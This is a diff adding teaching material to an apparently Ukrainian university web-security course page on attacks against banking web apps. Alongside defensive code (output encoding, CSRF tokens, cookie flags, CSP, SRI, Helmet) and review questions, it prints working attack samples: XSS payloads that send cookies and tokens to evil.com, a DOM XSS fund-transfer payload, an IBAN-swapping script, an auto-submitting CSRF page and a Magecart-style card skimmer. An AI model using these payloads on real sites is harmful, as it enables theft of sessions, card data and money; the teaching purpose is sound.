@@ -99,6 +99,103 @@
         </ul>
 
         <p><strong>Контексти ін'єкції.</strong> Ефективний захист від XSS вимагає розуміння контексту, в який потрапляють дані: HTML body (потрібно HTML-encoding), HTML-атрибути (attribute encoding), JavaScript (JS encoding), URL (URL encoding), CSS (CSS encoding). Кожен контекст вимагає різного типу екранування — універсального захисту не існує.</p>
+
+        <h3>Приклади XSS-payload для кожного типу</h3>
+        <p><strong>Reflected XSS</strong> — зловмисник формує URL з payload у параметрі пошуку:</p>
+        <pre><code>&lt;!-- Вразливий URL: https://bank.com/search?q=&lt;script&gt;...&lt;/script&gt; --&gt;
+
+&lt;!-- Серверний код (PHP) — ВРАЗЛИВИЙ --&gt;
+&lt;p&gt;Результати пошуку для: &lt;?php echo $_GET['q']; ?&gt;&lt;/p&gt;
+
+&lt;!-- Payload у параметрі q: --&gt;
+&lt;script&gt;
+  // Крадіжка сесійного cookie інтернет-банкінгу
+  new Image().src = 'https://evil.com/steal?cookie=' +
+    encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre>
+
+        <p><strong>Stored XSS</strong> — payload зберігається в базі даних через поле «Призначення платежу»:</p>
+        <pre><code>&lt;!-- Зловмисник вводить у поле "Призначення платежу": --&gt;
+Оплата послуг&lt;img src=x onerror="
+  fetch('https://evil.com/exfil', {
+    method: 'POST',
+    body: JSON.stringify({
+      cookies: document.cookie,
+      url: location.href,
+      localStorage: JSON.stringify(localStorage)
+    })
+  })
+"&gt;
+
+&lt;!-- Коли оператор банку переглядає транзакцію, скрипт виконується
+     з його привілеями — можливий доступ до адмін-панелі --&gt;</code></pre>
+
+        <p><strong>DOM-based XSS</strong> — вразливість у клієнтському JavaScript SPA-додатку банку:</p>
+        <pre><code>// ВРАЗЛИВИЙ код банківського SPA
+// URL: https://bank.com/dashboard#&lt;img src=x onerror=alert(1)&gt;
+
+const section = location.hash.substring(1);
+document.getElementById('content').innerHTML = section; // sink!
+
+// Зловмисник надсилає посилання:
+// https://bank.com/dashboard#&lt;img src=x onerror="
+//   fetch('/api/transfer', {
+//     method:'POST',
+//     headers:{'Content-Type':'application/json'},
+//     body: JSON.stringify({to:'UA1234567890',amount:50000})
+//   })
+// "&gt;</code></pre>
+
+        <h3>Порівняння: вразливий vs захищений код</h3>
+        <pre><code>// ❌ ВРАЗЛИВИЙ КОД — Node.js/Express
+app.get('/search', (req, res) =&gt; {
+  const query = req.query.q;
+  res.send(`&lt;h2&gt;Результати для: ${query}&lt;/h2&gt;`); // Без екранування!
+});
+
+// ✅ ЗАХИЩЕНИЙ КОД — з output encoding
+const escapeHtml = require('escape-html');
+
+app.get('/search', (req, res) =&gt; {
+  const query = escapeHtml(req.query.q);
+  res.send(`&lt;h2&gt;Результати для: ${query}&lt;/h2&gt;`);
+});
+// &lt;script&gt; перетворюється на &amp;lt;script&amp;gt; — не виконується</code></pre>
+
+        <h3>Реальний сценарій: XSS у фінансовому додатку</h3>
+        <pre><code>// Сценарій: XSS у формі онлайн-переказу
+// 1. Зловмисник знаходить Stored XSS у полі "Ім'я отримувача"
+// 2. Payload перехоплює форму переказу та підміняє реквізити
+
+// Шкідливий скрипт, що ін'єктується:
+(function() {
+  // Чекаємо завантаження форми переказу
+  const observer = new MutationObserver(() =&gt; {
+    const form = document.querySelector('#transfer-form');
+    if (form) {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        // Підміна IBAN отримувача на рахунок зловмисника
+        const ibanField = form.querySelector('[name="recipient_iban"]');
+        ibanField.value = 'UA903052992990004149123456789';
+        form.submit(); // Відправляємо з підміненими даними
+      });
+      observer.disconnect();
+    }
+  });
+  observer.observe(document.body, { childList: true, subtree: true });
+})();</code></pre>
+
+        <div class="control-questions">
+          <h3>Контрольні запитання</h3>
+          <ol>
+            <li>У чому принципова різниця між Reflected, Stored та DOM-based XSS з точки зору вектора доставки та масштабу ураження?</li>
+            <li>Чому DOM-based XSS не може бути виявлений серверними WAF-системами, і які інструменти слід використовувати для його виявлення?</li>
+            <li>Опишіть сценарій, при якому XSS у полі «Призначення платежу» може призвести до компрометації адміністратора банківської системи.</li>
+            <li>Чому екранування повинно відбуватися при виводі (output), а не при введенні (input)? Наведіть приклад, коли input-валідація буде недостатньою.</li>
+            <li>Яким чином зловмисник може використати XSS для підміни реквізитів банківського переказу в реальному часі?</li>
+          </ol>
+        </div>
       </section>
 
       <!-- Section 4.2 -->
@@ -129,6 +226,118 @@
           <li><strong>Захист:</strong> HTTP-заголовок <code>X-Frame-Options: DENY</code> (або SAMEORIGIN) забороняє вбудовування сторінки в iframe. Сучасний підхід — директива <code>frame-ancestors</code> у Content Security Policy.</li>
           <li><strong>Likejacking, Cursorjacking</strong> — варіації clickjacking для підміни дій у соціальних мережах та маніпуляції курсором.</li>
         </ul>
+
+        <h3>Приклад CSRF-атаки: прихована форма переказу коштів</h3>
+        <pre><code>&lt;!-- Шкідлива HTML-сторінка зловмисника (evil.com) --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;Вітаємо! Ви виграли iPhone!&lt;/h1&gt;
+
+  &lt;!-- Прихована форма, що автоматично відправляє переказ --&gt;
+  &lt;form id="csrf-form" action="https://bank.com/api/transfer"
+        method="POST" style="display:none"&gt;
+    &lt;input name="recipient" value="UA903052992990004149123456789" /&gt;
+    &lt;input name="amount" value="25000" /&gt;
+    &lt;input name="currency" value="UAH" /&gt;
+    &lt;input name="description" value="Поповнення рахунку" /&gt;
+  &lt;/form&gt;
+
+  &lt;script&gt;
+    // Форма відправляється автоматично при завантаженні
+    // Браузер додасть сесійний cookie банку до запиту
+    document.getElementById('csrf-form').submit();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <h3>Реалізація захисту від CSRF: Synchronizer Token Pattern</h3>
+        <pre><code>// Серверна частина — Node.js/Express з CSRF-захистом
+const csrf = require('csurf');
+const cookieParser = require('cookie-parser');
+
+app.use(cookieParser());
+const csrfProtection = csrf({ cookie: true });
+
+// Генерація форми з CSRF-токеном
+app.get('/transfer', csrfProtection, (req, res) =&gt; {
+  res.render('transfer', { csrfToken: req.csrfToken() });
+});
+
+// Перевірка CSRF-токена при отриманні POST-запиту
+app.post('/transfer', csrfProtection, (req, res) =&gt; {
+  // Якщо токен невалідний — csurf автоматично поверне 403 Forbidden
+  processTransfer(req.body);
+  res.send('Переказ виконано');
+});
+
+// HTML-форма з прихованим CSRF-токеном
+// &lt;form method="POST" action="/transfer"&gt;
+//   &lt;input type="hidden" name="_csrf" value="{{csrfToken}}" /&gt;
+//   &lt;input name="recipient" placeholder="IBAN отримувача" /&gt;
+//   &lt;input name="amount" placeholder="Сума" /&gt;
+//   &lt;button type="submit"&gt;Переказати&lt;/button&gt;
+// &lt;/form&gt;</code></pre>
+
+        <h3>Захист від Clickjacking: X-Frame-Options та CSP frame-ancestors</h3>
+        <pre><code># Налаштування HTTP-заголовків для захисту від Clickjacking
+
+# Варіант 1: X-Frame-Options (класичний підхід)
+# Повністю забороняє вбудовування в iframe
+X-Frame-Options: DENY
+
+# Дозволяє вбудовування лише з того самого домену
+X-Frame-Options: SAMEORIGIN
+
+# ---
+
+# Варіант 2: CSP frame-ancestors (сучасний підхід, замінює X-Frame-Options)
+# Повна заборона iframe
+Content-Security-Policy: frame-ancestors 'none';
+
+# Дозволити лише свій домен
+Content-Security-Policy: frame-ancestors 'self';
+
+# Дозволити конкретні довірені домени (наприклад, партнерський портал)
+Content-Security-Policy: frame-ancestors 'self' https://partner.bank.com;
+
+# ---
+
+# Реалізація в Express.js:
+# const helmet = require('helmet');
+# app.use(helmet.frameguard({ action: 'deny' }));
+#
+# Або через CSP:
+# app.use(helmet.contentSecurityPolicy({
+#   directives: {
+#     frameAncestors: ["'none'"]
+#   }
+# }));</code></pre>
+
+        <h3>Захист cookie від CSRF: SameSite атрибут</h3>
+        <pre><code># Налаштування cookie для фінансового додатку
+Set-Cookie: sessionId=abc123;
+  Secure;          # Лише через HTTPS
+  HttpOnly;        # Недоступний з JavaScript
+  SameSite=Strict; # Не відправляється у cross-site запитах
+  Path=/;
+  Domain=bank.com;
+  Max-Age=1800     # 30 хвилин
+
+# Порівняння SameSite значень:
+# Strict  — cookie ніколи не надсилається cross-site (максимальний захист)
+# Lax     — cookie надсилається лише при top-level GET-навігації
+# None    — cookie надсилається завжди (потрібен Secure; вразливий до CSRF)</code></pre>
+
+        <div class="control-questions">
+          <h3>Контрольні запитання</h3>
+          <ol>
+            <li>Поясніть, чому браузер автоматично надсилає cookies при cross-site запитах, і яким чином це робить можливою CSRF-атаку на банківський переказ.</li>
+            <li>Порівняйте Synchronizer Token Pattern та Double Submit Cookie як методи захисту від CSRF. Які переваги та недоліки кожного підходу?</li>
+            <li>У чому різниця між значеннями SameSite=Strict та SameSite=Lax? Чому для фінансових систем рекомендується Strict?</li>
+            <li>Опишіть сценарій Clickjacking-атаки на сторінку підтвердження платежу. Як frame-ancestors у CSP запобігає цій атаці?</li>
+            <li>Чому Custom Request Headers (наприклад, X-Requested-With) можуть слугувати захистом від CSRF для AJAX-запитів?</li>
+          </ol>
+        </div>
       </section>
 
       <!-- Section 4.3 -->
@@ -160,6 +369,145 @@
         </ul>
 
         <p><strong>Формджекінг (Formjacking)</strong> — ін'єкція шкідливого JavaScript у платіжні форми для крадіжки даних кредитних карток у реальному часі. Група Magecart здійснила серію масштабних атак: British Airways (380 000 карток), Ticketmaster, Newegg. Зловмисники компрометують або сам сайт, або сторонній JavaScript-скрипт (CDN, analytics, chat widget), який підключений до платіжної сторінки. Захист: Subresource Integrity (SRI), обмеження сторонніх скриптів через CSP, ізоляція платіжних сторінок.</p>
+
+        <h3>Крадіжка cookies через XSS: payload та захист</h3>
+        <pre><code>// ❌ XSS-payload для крадіжки cookies
+// Зловмисник ін'єктує цей код через XSS-вразливість:
+&lt;script&gt;
+  // Спосіб 1: через Image (обходить деякі фільтри)
+  new Image().src = 'https://evil.com/collect?c=' +
+    encodeURIComponent(document.cookie);
+
+  // Спосіб 2: через fetch (дозволяє POST великі об'єми даних)
+  fetch('https://evil.com/collect', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({
+      cookies: document.cookie,
+      url: window.location.href,
+      token: localStorage.getItem('jwt_token')
+    })
+  });
+&lt;/script&gt;
+
+// ✅ ЗАХИСТ: правильна конфігурація cookie
+// Навіть при успішній XSS-атаці, HttpOnly cookie недоступні з JS
+// document.cookie поверне порожній рядок для HttpOnly cookies</code></pre>
+
+        <h3>Безпечна конфігурація cookies для фінансового додатку</h3>
+        <pre><code>// Node.js/Express — налаштування безпечних cookies
+const session = require('express-session');
+
+app.use(session({
+  name: 'bankSessionId',  // Не використовуйте стандартні імена (JSESSIONID, connect.sid)
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    httpOnly: true,    // ✅ Недоступний з JavaScript (захист від XSS-крадіжки)
+    secure: true,      // ✅ Лише через HTTPS (захист від перехоплення в мережі)
+    sameSite: 'strict', // ✅ Не надсилається cross-site (захист від CSRF)
+    maxAge: 15 * 60 * 1000, // 15 хвилин — короткий час життя для банкінгу
+    domain: '.bank.com',
+    path: '/'
+  }
+}));
+
+// Додатковий захист: HSTS для примусового HTTPS
+app.use((req, res, next) =&gt; {
+  res.setHeader('Strict-Transport-Security',
+    'max-age=31536000; includeSubDomains; preload');
+  next();
+});</code></pre>
+
+        <h3>localStorage vs sessionStorage: порівняння ризиків</h3>
+        <pre><code>// ❌ НЕБЕЗПЕЧНО: зберігання токенів у localStorage
+localStorage.setItem('access_token', 'eyJhbGciOiJIUzI1NiIs...');
+localStorage.setItem('user_data', JSON.stringify({
+  name: 'Іван Петренко',
+  iban: 'UA903052992990004149123456789',
+  balance: 125000
+}));
+// Проблема: XSS дає ПОВНИЙ доступ до всіх даних
+// localStorage зберігається БЕЗСТРОКОВО навіть після закриття браузера
+
+// ⚠️ sessionStorage — трохи краще, але все ще вразливий до XSS
+sessionStorage.setItem('temp_token', 'eyJhbGciOiJIUzI1NiIs...');
+// Видаляється при закритті вкладки, але XSS все одно має доступ
+
+// ✅ РЕКОМЕНДОВАНИЙ підхід для фінансових додатків:
+// 1. Access token — зберігати ЛИШЕ в пам'яті (JavaScript-змінна)
+let accessToken = null; // Зникає при оновленні сторінки
+
+// 2. Refresh token — у HttpOnly Secure cookie
+// (встановлюється сервером, недоступний з JS)
+
+// 3. При оновленні сторінки — silent refresh через refresh token cookie
+async function silentRefresh() {
+  const response = await fetch('/api/auth/refresh', {
+    credentials: 'include' // Надсилає HttpOnly cookie
+  });
+  const data = await response.json();
+  accessToken = data.access_token; // Зберігаємо лише в пам'яті
+}
+
+// Порівняльна таблиця:
+// ┌──────────────────┬────────────┬────────────────┬───────────────┐
+// │ Характеристика   │ Cookie     │ localStorage   │ sessionStorage│
+// ├──────────────────┼────────────┼────────────────┼───────────────┤
+// │ HttpOnly         │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
+// │ Secure           │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
+// │ SameSite         │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
+// │ Доступ з JS      │ Блокується │ ✅ Завжди      │ ✅ Завжди     │
+// │ Час зберігання   │ Гнучкий    │ Безстроково    │ До закриття   │
+// │ Розмір           │ ~4 КБ      │ ~5-10 МБ       │ ~5-10 МБ      │
+// │ Для фін. токенів │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
+// └──────────────────┴────────────┴────────────────┴───────────────┘</code></pre>
+
+        <h3>Формджекінг: приклад шкідливого скрипта Magecart</h3>
+        <pre><code>// Спрощений приклад formjacking-скрипта (стиль Magecart)
+// Цей код ін'єктується у скомпрометований сторонній JS-файл
+// (наприклад, analytics.js або chat-widget.js)
+
+(function() {
+  // Чекаємо появу платіжної форми
+  const observer = new MutationObserver(function() {
+    const cardForm = document.querySelector('form[action*="payment"]') ||
+                     document.querySelector('#payment-form');
+    if (!cardForm) return;
+
+    cardForm.addEventListener('submit', function(e) {
+      // Збираємо дані кредитної картки
+      const cardData = {
+        number: cardForm.querySelector('[name="card_number"]').value,
+        expiry: cardForm.querySelector('[name="expiry"]').value,
+        cvv: cardForm.querySelector('[name="cvv"]').value,
+        name: cardForm.querySelector('[name="cardholder"]').value
+      };
+
+      // Відправляємо на сервер зловмисника (через Image для обходу CSP)
+      const exfilUrl = 'https://cdn-analytics.evil.com/collect.gif?' +
+        btoa(JSON.stringify(cardData));
+      new Image().src = exfilUrl;
+      // Оригінальна форма продовжує працювати — жертва не помічає крадіжку
+    });
+
+    observer.disconnect();
+  });
+
+  observer.observe(document.body, { childList: true, subtree: true });
+})();</code></pre>
+
+        <div class="control-questions">
+          <h3>Контрольні запитання</h3>
+          <ol>
+            <li>Чому зберігання JWT-токенів у localStorage вважається небезпечним для фінансових додатків, і який альтернативний підхід рекомендується?</li>
+            <li>Поясніть, яким чином атрибути HttpOnly, Secure та SameSite захищають cookie від різних типів атак (XSS, MITM, CSRF відповідно).</li>
+            <li>Що таке Cookie Tossing і чому ця атака особливо небезпечна для банків з кількома піддоменами?</li>
+            <li>Опишіть принцип роботи formjacking-атаки у стилі Magecart. Чому компрометація стороннього JavaScript-файлу є особливо ефективним вектором?</li>
+            <li>Яка різниця між Session Hijacking, Session Sniffing та Session Fixation? Які заходи захисту ефективні проти кожного типу?</li>
+          </ol>
+        </div>
       </section>
 
       <!-- Section 4.4 -->
@@ -200,6 +548,179 @@
           <li><code>Referrer-Policy: strict-origin-when-cross-origin</code> — контроль витоку URL</li>
           <li><code>Permissions-Policy</code> — обмеження доступу до API браузера (camera, microphone, geolocation)</li>
         </ul>
+
+        <h3>Content Security Policy: сувора політика для банківського додатку</h3>
+        <pre><code># CSP для банківського веб-додатку — nonce-based підхід
+# Це найсуворіша та найбезпечніша конфігурація
+
+Content-Security-Policy:
+  default-src 'none';                          # За замовчуванням — все заблоковано
+  script-src 'nonce-{random}' 'strict-dynamic'; # Скрипти лише з одноразовим nonce
+  style-src 'self' 'nonce-{random}';           # Стилі лише свої + з nonce
+  img-src 'self' data:;                        # Зображення лише свої
+  font-src 'self';                             # Шрифти лише свої
+  connect-src 'self' https://api.bank.com;     # AJAX лише до свого API
+  frame-ancestors 'none';                      # Заборона вбудовування в iframe
+  base-uri 'self';                             # Захист від base tag injection
+  form-action 'self';                          # Форми відправляються лише на свій домен
+  require-trusted-types-for 'script';          # Примусові Trusted Types
+  report-uri /api/csp-report;                  # Звіти про порушення
+
+# Використання nonce у HTML:
+# &lt;script nonce="{random}"&gt;
+#   // Цей скрипт виконається — nonce збігається
+#   initBankingApp();
+# &lt;/script&gt;
+#
+# &lt;script&gt;alert('XSS')&lt;/script&gt;
+# // Цей скрипт ЗАБЛОКОВАНО — немає валідного nonce
+
+# ---
+
+# CSP у режимі Report-Only (для тестування перед впровадженням)
+Content-Security-Policy-Report-Only:
+  default-src 'self';
+  script-src 'self' 'nonce-{random}';
+  report-uri /api/csp-report;</code></pre>
+
+        <h3>Санітизація HTML: DOMPurify</h3>
+        <pre><code>// DOMPurify — безпечна санітизація HTML на клієнті
+// Використовується коли потрібно відобразити HTML-контент
+// (наприклад, повідомлення від клієнтів у адмін-панелі банку)
+
+import DOMPurify from 'dompurify';
+
+// ❌ НЕБЕЗПЕЧНО — пряме вставляння HTML
+element.innerHTML = userInput;
+
+// ✅ БЕЗПЕЧНО — санітизація через DOMPurify
+element.innerHTML = DOMPurify.sanitize(userInput);
+
+// Конфігурація DOMPurify для фінансового додатку (максимально сувора):
+const cleanHTML = DOMPurify.sanitize(userInput, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'], // Мінімальний набір тегів
+  ALLOWED_ATTR: [],         // Жодних атрибутів
+  ALLOW_DATA_ATTR: false,   // Заборона data-* атрибутів
+  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
+  FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus']
+});
+
+// Приклад роботи:
+const malicious = '&lt;p&gt;Привіт&lt;/p&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;' +
+                  '&lt;img src=x onerror="steal()"&gt;';
+const safe = DOMPurify.sanitize(malicious);
+// Результат: '&lt;p&gt;Привіт&lt;/p&gt;'
+// &lt;script&gt; та &lt;img onerror&gt; повністю видалені</code></pre>
+
+        <h3>Subresource Integrity (SRI): захист від компрометації CDN</h3>
+        <pre><code>&lt;!-- SRI — перевірка цілісності зовнішніх ресурсів --&gt;
+&lt;!-- Якщо CDN скомпрометовано, браузер відмовиться завантажувати змінений файл --&gt;
+
+&lt;!-- Підключення jQuery з CDN з перевіркою SRI --&gt;
+&lt;script
+  src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
+  integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"
+  crossorigin="anonymous"&gt;
+&lt;/script&gt;
+
+&lt;!-- Підключення CSS з SRI --&gt;
+&lt;link
+  rel="stylesheet"
+  href="https://cdn.example.com/styles.css"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
+  crossorigin="anonymous"&gt;
+
+&lt;!-- Генерація SRI-хешу (у терміналі): --&gt;
+&lt;!-- cat script.js | openssl dgst -sha384 -binary | openssl base64 -A --&gt;
+&lt;!-- Або: shasum -b -a 384 script.js | awk '{ print $1 }' | xxd -r -p | base64 --&gt;
+
+&lt;!-- Вимога SRI через CSP (блокує скрипти без integrity): --&gt;
+&lt;!-- Content-Security-Policy: require-sri-for script style; --&gt;</code></pre>
+
+        <h3>Повна конфігурація безпечних HTTP-заголовків (Helmet.js)</h3>
+        <pre><code>// Комплексна конфігурація безпечних заголовків для Express.js
+// Helmet.js автоматизує встановлення усіх необхідних заголовків
+
+const express = require('express');
+const helmet = require('helmet');
+const crypto = require('crypto');
+
+const app = express();
+
+// Генерація nonce для кожного запиту
+app.use((req, res, next) =&gt; {
+  res.locals.cspNonce = crypto.randomBytes(32).toString('base64');
+  next();
+});
+
+// Комплексна конфігурація Helmet для банківського додатку
+app.use((req, res, next) =&gt; {
+  helmet({
+    // Content Security Policy
+    contentSecurityPolicy: {
+      directives: {
+        defaultSrc: ["'none'"],
+        scriptSrc: [`'nonce-${res.locals.cspNonce}'`, "'strict-dynamic'"],
+        styleSrc: ["'self'", `'nonce-${res.locals.cspNonce}'`],
+        imgSrc: ["'self'", "data:"],
+        fontSrc: ["'self'"],
+        connectSrc: ["'self'", "https://api.bank.com"],
+        frameAncestors: ["'none'"],
+        baseUri: ["'self'"],
+        formAction: ["'self'"],
+        reportUri: '/api/csp-report'
+      }
+    },
+    // Strict Transport Security — примусовий HTTPS
+    strictTransportSecurity: {
+      maxAge: 31536000,       // 1 рік
+      includeSubDomains: true,
+      preload: true
+    },
+    // Захист від Clickjacking
+    frameguard: { action: 'deny' },
+    // Запобігання MIME-sniffing
+    noSniff: true,
+    // Referrer Policy
+    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+    // Permissions Policy — обмеження API браузера
+    permittedCrossDomainPolicies: { permittedPolicies: 'none' }
+  })(req, res, next);
+});
+
+// Додаткові заголовки, які Helmet не покриває
+app.use((req, res, next) =&gt; {
+  // Permissions-Policy (обмеження доступу до камери, мікрофона тощо)
+  res.setHeader('Permissions-Policy',
+    'camera=(), microphone=(), geolocation=(), payment=(self)');
+
+  // Cross-Origin заголовки для ізоляції
+  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
+  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
+  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
+
+  next();
+});
+
+// Результуючі HTTP-заголовки відповіді:
+// Content-Security-Policy: default-src 'none'; script-src 'nonce-abc123' ...
+// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+// X-Frame-Options: DENY
+// X-Content-Type-Options: nosniff
+// Referrer-Policy: strict-origin-when-cross-origin
+// Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(self)
+// Cross-Origin-Opener-Policy: same-origin</code></pre>
+
+        <div class="control-questions">
+          <h3>Контрольні запитання</h3>
+          <ol>
+            <li>Поясніть різницю між whitelist-based та nonce-based CSP. Чому nonce-based підхід вважається більш надійним для захисту від XSS?</li>
+            <li>Яким чином Subresource Integrity (SRI) захищає від formjacking-атак типу Magecart? Опишіть механізм перевірки.</li>
+            <li>Чому output encoding повинен відповідати контексту виводу (HTML, JS, URL, CSS)? Наведіть приклад, коли HTML-encoding не захистить від XSS в JavaScript-контексті.</li>
+            <li>Що таке Trusted Types і як вони запобігають DOM-based XSS на рівні платформи? Які sinks блокуються?</li>
+            <li>Перелічіть мінімальний набір HTTP-заголовків безпеки для фінансового веб-додатку та поясніть роль кожного з них.</li>
+          </ol>
+        </div>
       </section>
 
       <!-- Summary -->
